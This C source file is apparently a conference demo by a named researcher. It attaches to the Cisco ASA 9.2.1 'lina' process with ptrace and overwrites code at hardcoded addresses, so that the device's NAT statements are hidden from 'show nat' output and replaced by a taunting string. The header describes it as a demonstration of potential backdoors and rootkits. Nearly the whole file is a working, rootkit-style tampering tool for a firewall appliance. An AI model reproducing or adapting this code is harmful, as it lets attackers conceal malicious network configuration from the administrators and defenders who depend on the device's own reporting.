/* Example of run time manipulation of the Cisco ASA "lina" process...
   Hides Cisco ASA NATs in Cisco ASA 9.2.1 (64 bit)
   Simply NOPs out the call to print NATS, nothing fancy but demonstrates potential for future back doors/rootkits etc...
   Demo purposes only for Ruxcon/Kiwicon presentation :
   Breaking Bricks and Plumbing Pipes: Cisco ASA a Super Mario Adventure.
   by Alec Stuart-Muirk
*/ 

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <dirent.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/ptrace.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/stat.h>
#include <signal.h>
#include <stdlib.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/syscall.h>


pid_t proc_find(const char* name) 
{
    DIR* dir;
    struct dirent* ent;
    char buf[512];

    long  pid;
    char pname[100] = {0,};
    char state;
    FILE *fp=NULL; 

    if (!(dir = opendir("/proc"))) {
        perror("can't open /proc");
        return -1;
    }

    while((ent = readdir(dir)) != NULL) {
        long lpid = atol(ent->d_name);
        if(lpid < 0)
            continue;
        snprintf(buf, sizeof(buf), "/proc/%ld/stat", lpid);
        fp = fopen(buf, "r");

        if (fp) {
            if ( (fscanf(fp, "%ld (%[^)]) %c", &pid, pname, &state)) != 3 ){
                printf("fscanf failed \n");
                fclose(fp);
                closedir(dir);
                return -1; 
            }
            if (!strcmp(pname, name)) {
                fclose(fp);
                closedir(dir);
                return (pid_t)lpid;
            }
            fclose(fp);
        }
    }
closedir(dir);
return -1;
}


int main(int argc, char* argv[]) 
{
	// These addresses are for Cisco ASA 9.2.1 only...
	int action=0;
	long printnat_addr = 0x0000000001479301;
    long shnat_string =  0x0000000002A06738;
    long shnat_call   =  0x000000000147A046;

    int i;
	int buffsize;
	char *buff;
	char hide_run_code[] = "\x90\x90\x90\x90\x90\x44\x8B\x55";
	char show_run_code[] = "\xE8\x2A\xFA\xFF\xFF\x44\x8B\x55";	
	char the_string[] = "M4R10 H4S H1DD3N 4LL TH3 N4TS!\n";
	char orig_string[] = "Manual NAT Policies (Section 1)\n";
	char hide_shnat_code[] = "\x90\x90\x90\x90\x90\xC7\x45\xC0";
	char show_shnat_code[] = "\xE8\xF5\xF8\xFF\xFF\xC7\x45\xC0";



    if (argc != 2 ) {
        printf("usage: %s [hide] [show]\n", argv[0]);
        return 1;	
    }
	    
    pid_t pid = proc_find("lina");
    if (pid == -1) {
            printf("[-]\tlina process not found..exiting.\n");
			return 1;
	}
	
	if(strncmp (argv[1], "hide",4)==0){
		printf("[+]\tHiding NAT statements\n");
		printf("[+]\t Found lina process with pid : %d\n",  pid);
		printf("[+]\t Attaching to pid : %d\n",  pid);
		ptrace (PTRACE_ATTACH,pid,0,0);
		wait ((int*) 0);
		printf("[+]\t Patching memory at : 0x%.16x\n", printnat_addr);
		printf("[+]\t Patching memory at : 0x%.16x\n", shnat_call);
		printf("[+]\t Patching memory at : 0x%.16x\n", shnat_string);
		ptrace(PTRACE_POKETEXT, pid, printnat_addr, *(long*)(hide_run_code));
		ptrace(PTRACE_POKETEXT, pid, shnat_call, *(long*)(hide_shnat_code));
		for (i = 0; i < 32; i += 8)
			ptrace(PTRACE_POKETEXT, pid, shnat_string+i, *(long*)(the_string+i));			
		printf("[+]\t Detaching from pid : %d\n",  pid); 
		ptrace (PTRACE_DETACH,pid,0,0);
		printf("[+]\t NAT Statements are now hidden..\n",  pid);		

	}
	else if(strncmp (argv[1], "show",4)==0){
		printf("[+]\tRevealing NAT statements\n");
		printf("[+]\t Found lina process with pid : %d\n",  pid);
		printf("[+]\t Attaching to pid : %d\n",  pid);
		ptrace (PTRACE_ATTACH,pid,0,0);
		wait ((int*) 0);
		printf("[+]\t Patching memory at : 0x%.16x\n", printnat_addr);
		printf("[+]\t Patching memory at : 0x%.16x\n", shnat_call);
		printf("[+]\t Patching memory at : 0x%.16x\n", shnat_string);
		ptrace(PTRACE_POKETEXT, pid, printnat_addr, *(long*)(show_run_code));
		ptrace(PTRACE_POKETEXT, pid, shnat_call, *(long*)(show_shnat_code));
		for (i = 0; i < 32; i += 8)
			ptrace(PTRACE_POKETEXT, pid, shnat_string+i, *(long*)(orig_string+i));			
		printf("[+]\t Detaching from pid : %d\n",  pid); 
		ptrace (PTRACE_DETACH,pid,0,0);
		printf("[+]\t NAT Statements are now revealed..\n",  pid);			
    }
	else{
	        printf("usage: %s [hide] [show]\n", argv[0]);
        return 1;
    }

	
    return 0;
}
